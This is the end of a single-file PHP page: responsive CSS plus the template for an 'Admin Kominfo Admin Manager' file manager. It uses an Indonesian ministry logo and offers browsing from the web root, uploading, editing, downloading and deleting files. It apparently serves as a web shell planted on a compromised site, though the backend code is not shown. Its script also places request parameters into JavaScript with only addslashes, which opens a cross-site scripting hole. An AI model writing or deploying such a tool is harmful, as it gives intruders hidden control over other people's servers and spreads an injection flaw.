                margin-bottom: 16px;
            }

            .panel-header h2 {
                font-size: 22px;
                margin-bottom: 4px;
            }

            .panel-header p {
                font-size: 13px;
            }

            .panel-tags {
                gap: 8px;
                margin-top: 8px;
            }

            .tag {
                padding: 6px 10px;
                font-size: 11px;
            }

            .preview-text,
            .editor-box textarea {
                min-height: 300px;
                padding: 16px;
                font-size: 12px;
            }

            .preview-media {
                padding: 12px;
            }

            .preview-media img,
            .preview-media iframe,
            .preview-media video,
            .preview-media audio {
                max-height: 60vh;
                border-radius: 12px;
            }

            .panel-actions {
                gap: 8px;
                margin-top: 12px;
                flex-wrap: nowrap;
                overflow-x: auto;
                padding-bottom: 4px;
            }

            .panel-actions a {
                padding: 10px 12px;
                border-radius: 10px;
                font-size: 12px;
                white-space: nowrap;
                flex-shrink: 0;
            }

            .table-shell {
                overflow: hidden;
            }

            .table-header {
                padding: 16px;
                gap: 12px;
                flex-direction: column;
                align-items: flex-start;
                border-bottom: 1px solid rgba(148, 163, 184, 0.15);
            }

            .table-header h2 {
                font-size: 18px;
                margin-bottom: 4px;
            }

            .table-header p {
                font-size: 13px;
            }

            .table-meta {
                width: 100%;
                gap: 8px;
            }

            .table-meta span {
                padding: 6px 10px;
                font-size: 11px;
            }

            .table-wrap {
                overflow-x: auto;
                -webkit-overflow-scrolling: touch;
            }

            table {
                min-width: 1000px;
            }

            thead {
                position: sticky;
                top: 0;
                z-index: 10;
            }

            th {
                padding: 12px 14px;
                font-size: 10px;
                letter-spacing: 0.08em;
            }

            td {
                padding: 12px 14px;
                border-bottom: 1px solid rgba(226, 232, 240, 0.88);
            }

            .item-name {
                gap: 10px;
            }

            .item-icon {
                width: 36px;
                height: 36px;
                border-radius: 10px;
                font-size: 18px;
            }

            .item-link {
                font-size: 14px;
            }

            .item-subtitle {
                font-size: 11px;
            }

            .type-badge {
                padding: 6px 10px;
                font-size: 10px;
            }

            .actions {
                flex-wrap: nowrap;
                gap: 4px;
                overflow-x: auto;
                -webkit-overflow-scrolling: touch;
                padding-bottom: 2px;
            }

            .actions a {
                font-size: 11px;
                padding: 7px 9px;
                border-radius: 8px;
                white-space: nowrap;
                flex-shrink: 0;
            }

            .empty-message {
                padding: 48px 16px;
            }

            .empty-message strong {
                font-size: 16px;
                margin-bottom: 6px;
            }
        }

        @media (max-width: 480px) {
            body {
                padding: 12px 8px;
            }

            .hero-card {
                padding: 16px;
            }

            .hero h1 {
                font-size: 22px;
            }

            .hero p {
                font-size: 13px;
            }

            .logout-btn {
                padding: 9px 14px;
                font-size: 12px;
            }

            .meta-pill {
                font-size: 10px;
                padding: 6px 10px;
            }

            .stat strong {
                font-size: 20px;
            }

            .control-card h3 {
                font-size: 15px;
            }

            .form-inline input,
            .form-inline textarea,
            .form-inline button,
            .action-link {
                padding: 10px 12px;
                font-size: 12px;
                border-radius: 9px;
            }

            .panel {
                padding: 14px;
            }

            .panel-header h2 {
                font-size: 20px;
            }

            .preview-text,
            .editor-box textarea {
                min-height: 250px;
                padding: 12px;
                font-size: 11px;
                line-height: 1.6;
            }

            table {
                min-width: 900px;
                font-size: 12px;
            }

            th {
                padding: 10px 12px;
                font-size: 9px;
            }

            td {
                padding: 10px 12px;
            }

            .item-link {
                font-size: 13px;
            }

            .actions a {
                padding: 6px 8px;
                font-size: 10px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <section class="hero">
            <div class="hero-card">
                <div class="hero-top">
                    <div>
                        <div class="brand">
                            <img src="https://www.idn.id/wp-content/uploads/2024/12/kominfo.png" alt="Kominfo Logo">
                            <div>
                                <span class="eyebrow">Secure Workspace</span>
                                <h1>🏛️ Admin Kominfo Admin Manager</h1>
                                </div>
                        </div>
                    </div>
                    <a href="?logout=1" class="logout-btn">🚪 Logout</a>
                </div>

                <div class="hero-meta">
                    <span class="meta-pill">📂 Direktori aktif: <?php echo htmlspecialchars(basename($currentDir) !== '' ? basename($currentDir) : $currentDir); ?></span>
                    <span class="meta-pill">🕒 Login sejak <?php echo isset($_SESSION['start_time']) ? date('H:i', $_SESSION['start_time']) : '-'; ?></span>
                    <span class="meta-pill">🛡️ Root aman: <?php echo htmlspecialchars($_SERVER['DOCUMENT_ROOT']); ?></span>
                </div>
            </div>

            <div class="stats-card">
                <div class="stat">
                    <span>Total Folder</span>
                    <strong><?php echo count($folders); ?></strong>
                    <small>Navigasi struktur direktori aktif</small>
                </div>
                <div class="stat">
                    <span>Total File</span>
                    <strong><?php echo count($filesList); ?></strong>
                    <small>Siap dilihat, diunduh, atau diedit</small>
                </div>
                <div class="stat">
                    <span>Total Ukuran</span>
                    <strong><?php echo formatBytes($totalFileSize); ?></strong>
                    <small>Akumulasi file pada folder ini</small>
                </div>
            </div>
        </section>

        <div class="path-bar">
            <strong>📍 Lokasi</strong>
            <div class="path-links">
                <?php
                $pathParts = explode(DIRECTORY_SEPARATOR, trim($currentDir, DIRECTORY_SEPARATOR));
                $buildPath = '';
                $documentRootTrimmed = trim($_SERVER['DOCUMENT_ROOT'], DIRECTORY_SEPARATOR);
                $rootParts = explode(DIRECTORY_SEPARATOR, $documentRootTrimmed);

                echo '<a href="' . buildQuery(['dir' => $_SERVER['DOCUMENT_ROOT']]) . '">root</a>';

                foreach ($pathParts as $index => $part) {
                    if ($part === '') {
                        continue;
                    }

                    $buildPath .= DIRECTORY_SEPARATOR . $part;
                    if ($index < count($rootParts) - 1) {
                        continue;
                    }

                    if (strpos($buildPath, $_SERVER['DOCUMENT_ROOT']) === 0) {
                        echo '<span>/</span>';
                        echo '<a href="' . buildQuery(['dir' => $buildPath]) . '">' . htmlspecialchars($part) . '</a>';
                    }
                }
                ?>
            </div>
        </div>

        <?php if ($message !== ''): ?>
            <div class="notice success">✅ <?php echo htmlspecialchars($message); ?></div>
        <?php endif; ?>

        <?php if ($uploadMessage !== ''): ?>
            <div class="notice success">📤 <?php echo htmlspecialchars($uploadMessage); ?></div>
        <?php endif; ?>

        <?php if ($errorMessage !== ''): ?>
            <div class="notice error">⚠️ <?php echo htmlspecialchars($errorMessage); ?></div>
        <?php endif; ?>

        <?php if ($selectedPanel !== null): ?>
            <section class="panel">
                <div class="panel-header">
                    <div>
                        <h2><?php echo $selectedPanel['mode'] === 'edit' ? '✏️ Edit File' : '👁️ View File'; ?></h2>
                        <p><?php echo htmlspecialchars($selectedPanel['name']); ?> · <?php echo htmlspecialchars($selectedPanel['mime']); ?></p>
                        <div class="panel-tags">
                            <span class="tag">Ukuran: <?php echo formatBytes($selectedPanel['size']); ?></span>
                            <span class="tag">Update: <?php echo htmlspecialchars($selectedPanel['updated']); ?></span>
                            <span class="tag">Tipe: <?php echo htmlspecialchars(getFileTypeLabel($selectedPanel['name'])); ?></span>
                        </div>
                    </div>
                    <div class="panel-actions">
                        <?php if ($selectedPanel['editable']): ?>
                            <?php if ($selectedPanel['mode'] === 'view'): ?>
                                <a href="<?php echo buildQuery(['dir' => $currentDir, 'action' => 'edit', 'file' => $selectedPanel['name']]); ?>">✏️ Edit sekarang</a>
                            <?php else: ?>
                                <a class="alt" href="<?php echo buildQuery(['dir' => $currentDir, 'action' => 'view', 'file' => $selectedPanel['name']]); ?>">👁️ Buka preview</a>
                            <?php endif; ?>
                        <?php endif; ?>
                        <a class="alt" href="<?php echo buildQuery(['dir' => $currentDir, 'action' => 'download', 'file' => $selectedPanel['name']]); ?>">⬇️ Download</a>
                    </div>
                </div>

                <?php if ($selectedPanel['mode'] === 'edit'): ?>
                    <form method="POST" class="form-inline">
                        <input type="hidden" name="filename" value="<?php echo htmlspecialchars($selectedPanel['name']); ?>">
                        <div class="editor-box">
                            <textarea name="content"><?php echo htmlspecialchars($selectedPanel['content']); ?></textarea>
                        </div>
                        <button type="submit" name="savefile" value="1">💾 Simpan perubahan</button>
                    </form>
                <?php else: ?>
                    <div class="preview-box">
                        <?php if ($selectedPanel['image']): ?>
                            <div class="preview-media">
                                <img src="<?php echo buildQuery(['dir' => $currentDir, 'action' => 'stream', 'file' => $selectedPanel['name']]); ?>" alt="Preview <?php echo htmlspecialchars($selectedPanel['name']); ?>">
                            </div>
                        <?php elseif ($selectedPanel['pdf']): ?>
                            <div class="preview-media">
                                <iframe src="<?php echo buildQuery(['dir' => $currentDir, 'action' => 'stream', 'file' => $selectedPanel['name']]); ?>"></iframe>
                            </div>
                        <?php elseif ($selectedPanel['media']): ?>
                            <div class="preview-media">
                                <?php if (strpos($selectedPanel['mime'], 'video/') === 0): ?>
                                    <video controls src="<?php echo buildQuery(['dir' => $currentDir, 'action' => 'stream', 'file' => $selectedPanel['name']]); ?>"></video>
                                <?php else: ?>
                                    <audio controls src="<?php echo buildQuery(['dir' => $currentDir, 'action' => 'stream', 'file' => $selectedPanel['name']]); ?>"></audio>
                                <?php endif; ?>
                            </div>
                        <?php elseif ($selectedPanel['editable']): ?>
                            <pre class="preview-text"><?php echo htmlspecialchars($selectedPanel['content']); ?></pre>
                        <?php else: ?>
                            <div class="preview-fallback">
                                <strong>Preview inline belum tersedia untuk file ini.</strong>
                                <p style="margin-top: 10px; color: #94a3b8;">Gunakan tombol download untuk membuka file dengan aplikasi yang sesuai.</p>
                            </div>
                        <?php endif; ?>
                    </div>
                <?php endif; ?>
            </section>
        <?php endif; ?>

        <section class="controls-grid">
            <div class="control-card">
                <h3>📁 Folder Baru</h3>
                <p>Buat direktori baru langsung dari workspace aktif.</p>
                <form method="POST" class="form-inline">
                    <input type="text" name="newfolder" placeholder="Contoh: assets, backup, draft" required>
                    <button type="submit">➕ Buat folder</button>
                </form>
            </div>

            <div class="control-card">
                <h3>📤 Upload File</h3>
                <p>Taruh file baru ke folder yang sedang dibuka sekarang.</p>
                <form method="POST" enctype="multipart/form-data" class="form-inline">
                    <input type="file" name="file" required>
                    <button type="submit">🚀 Upload sekarang</button>
                </form>
            </div>

            <div class="control-card">
                <h3>🧭 Navigasi Cepat</h3>
                <p>Pindah ke folder sebelumnya atau kembali ke root dengan satu klik.</p>
                <div class="form-inline">
                    <?php if ($currentDir !== $_SERVER['DOCUMENT_ROOT']): ?>
                        <a class="action-link secondary" href="<?php echo buildQuery(['dir' => $parentDir]); ?>">⬆️ Kembali ke parent</a>
                    <?php endif; ?>
                    <a class="action-link" href="<?php echo buildQuery(['dir' => $_SERVER['DOCUMENT_ROOT']]); ?>">🏠 Buka root</a>
                </div>
            </div>
        </section>

        <section class="table-shell">
            <div class="table-header">
                <div>
                    <h2>📚 Daftar File & Folder</h2>
                    <p>Klik folder untuk masuk. Untuk file, sekarang tersedia aksi view, edit, download, dan hapus.</p>
                </div>
                <div class="table-meta">
                    <span><?php echo count($folders); ?> folder</span>
                    <span><?php echo count($filesList); ?> file</span>
                    <span><?php echo formatBytes($totalFileSize); ?></span>
                </div>
            </div>

            <div class="table-wrap">
                <table>
                    <thead>
                        <tr>
                            <th style="width: 34%;">Nama</th>
                            <th style="width: 12%;">Tipe</th>
                            <th style="width: 14%;">Ukuran</th>
                            <th style="width: 18%;">Terakhir Diubah</th>
                            <th style="width: 22%;">Aksi</th>
                        </tr>
                    </thead>
                    <tbody>
                        <?php $hasItems = false; ?>

                        <?php foreach ($folders as $folder): ?>
                            <?php
                            $hasItems = true;
                            $folderPath = $currentDir . DIRECTORY_SEPARATOR . $folder;
                            ?>
                            <tr>
                                <td>
                                    <div class="item-name">
                                        <span class="item-icon">📁</span>
                                        <div>
                                            <a href="<?php echo buildQuery(['dir' => $folderPath]); ?>" class="item-link"><?php echo htmlspecialchars($folder); ?></a>
                                            <span class="item-subtitle">Folder direktori</span>
                                        </div>
                                    </div>
                                </td>
                                <td><span class="type-badge">Folder</span></td>
                                <td>-</td>
                                <td><?php echo date('d M Y H:i', filemtime($folderPath)); ?></td>
                                <td>
                                    <div class="actions">
                                        <a href="<?php echo buildQuery(['dir' => $folderPath]); ?>">📂 Buka</a>
                                        <a href="<?php echo buildQuery(['dir' => $currentDir, 'action' => 'deletedir', 'file' => $folder]); ?>" class="delete" onclick="return confirm('Yakin hapus folder ini? Folder harus kosong.');">🗑️ Hapus</a>
                                    </div>
                                </td>
                            </tr>
                        <?php endforeach; ?>

                        <?php foreach ($filesList as $file): ?>
                            <?php
                            $hasItems = true;
                            $filePath = $currentDir . DIRECTORY_SEPARATOR . $file;
                            $fileSize = filesize($filePath);
                            $editable = isEditableFile($filePath);
                            ?>
                            <tr>
                                <td>
                                    <div class="item-name">
                                        <span class="item-icon">📄</span>
                                        <div>
                                            <a href="<?php echo buildQuery(['dir' => $currentDir, 'action' => 'view', 'file' => $file]); ?>" class="item-link"><?php echo htmlspecialchars($file); ?></a>
                                            <span class="item-subtitle"><?php echo htmlspecialchars(getMimeTypeSafe($filePath)); ?></span>
                                        </div>
                                    </div>
                                </td>
                                <td><span class="type-badge"><?php echo htmlspecialchars(getFileTypeLabel($file)); ?></span></td>
                                <td><?php echo formatBytes($fileSize); ?></td>
                                <td><?php echo date('d M Y H:i', filemtime($filePath)); ?></td>
                                <td>
                                    <div class="actions">
                                        <a href="<?php echo buildQuery(['dir' => $currentDir, 'action' => 'view', 'file' => $file]); ?>">👁️ View</a>
                                        <?php if ($editable): ?>
                                            <a href="<?php echo buildQuery(['dir' => $currentDir, 'action' => 'edit', 'file' => $file]); ?>" class="edit">✏️ Edit</a>
                                        <?php endif; ?>
                                        <a href="<?php echo buildQuery(['dir' => $currentDir, 'action' => 'download', 'file' => $file]); ?>" class="download">⬇️ Download</a>
                                        <a href="<?php echo buildQuery(['dir' => $currentDir, 'action' => 'delete', 'file' => $file]); ?>" class="delete" onclick="return confirm('Yakin hapus file ini?');">🗑️ Hapus</a>
                                    </div>
                                </td>
                            </tr>
                        <?php endforeach; ?>

                        <?php if (!$hasItems): ?>
                            <tr>
                                <td colspan="5" class="empty-message">
                                    <strong>📭 Folder masih kosong</strong>
                                    Upload file pertama Anda atau buat folder baru untuk mulai mengelola isi direktori ini.
                                </td>
                            </tr>
                        <?php endif; ?>
                    </tbody>
                </table>
            </div>
        </section>
    </div>

    <script>
        // Clean URL navigation dengan History API
        class FileManagerNav {
            constructor() {
                this.currentDir = '<?php echo addslashes($currentDir); ?>';
                this.init();
            }

            init() {
                // Intercept semua link navigasi
                document.addEventListener('click', (e) => this.handleLinkClick(e));
                
                // Handle back/forward button
                window.addEventListener('popstate', (e) => {
                    if (e.state && e.state.type === 'navigation') {
                        this.reload(e.state);
                    }
                });

                // Set initial state
                const initialState = {
                    type: 'navigation',
                    dir: this.currentDir,
                    action: '<?php echo isset($_GET['action']) ? addslashes($_GET['action']) : ''; ?>',
                    file: '<?php echo isset($_GET['file']) ? addslashes($_GET['file']) : ''; ?>'
                };
                history.replaceState(initialState, '', window.location.pathname);
            }

            handleLinkClick(e) {
                const link = e.target.closest('a');
                if (!link) return;

                const href = link.getAttribute('href');
                if (!href || href.startsWith('?logout=')) return;

                // Parse query string
                const queryPart = href.split('?')[1];
                if (!queryPart) return;

                const params = new URLSearchParams(queryPart);
                const dir = params.get('dir');
                const action = params.get('action');
                const file = params.get('file');

                // Untuk delete/download, biarkan normal behavior
                if (action === 'delete' || action === 'deletedir' || action === 'download') {
                    return;
                }

                // Navigate dengan clean URL
                if (dir || action || file) {
                    e.preventDefault();
                    this.navigate({ dir: dir || this.currentDir, action, file });
                }
            }

            navigate(state) {
                const params = new URLSearchParams();
                if (state.dir) params.append('dir', state.dir);
                if (state.action) params.append('action', state.action);
                if (state.file) params.append('file', state.file);

                const newUrl = params.toString() ? `?${params}` : window.location.pathname;
                
                history.pushState(
                    { ...state, type: 'navigation' },
                    '',
                    newUrl
                );

                this.reload(state);
            }

            reload(state) {
                // Reload page dengan state baru tanpa menampilkan loading
                const params = new URLSearchParams();
                if (state.dir) params.append('dir', state.dir);
                if (state.action) params.append('action', state.action);
                if (state.file) params.append('file', state.file);

                const url = params.toString() ? `${window.location.pathname}?${params}` : window.location.pathname;
                window.location.href = url;
            }
        }

        // Initialize saat DOM ready
        if (document.readyState === 'loading') {
            document.addEventListener('DOMContentLoaded', () => {
                new FileManagerNav();
            });
        } else {
            new FileManagerNav();
        }
    </script>
</body>
</html>
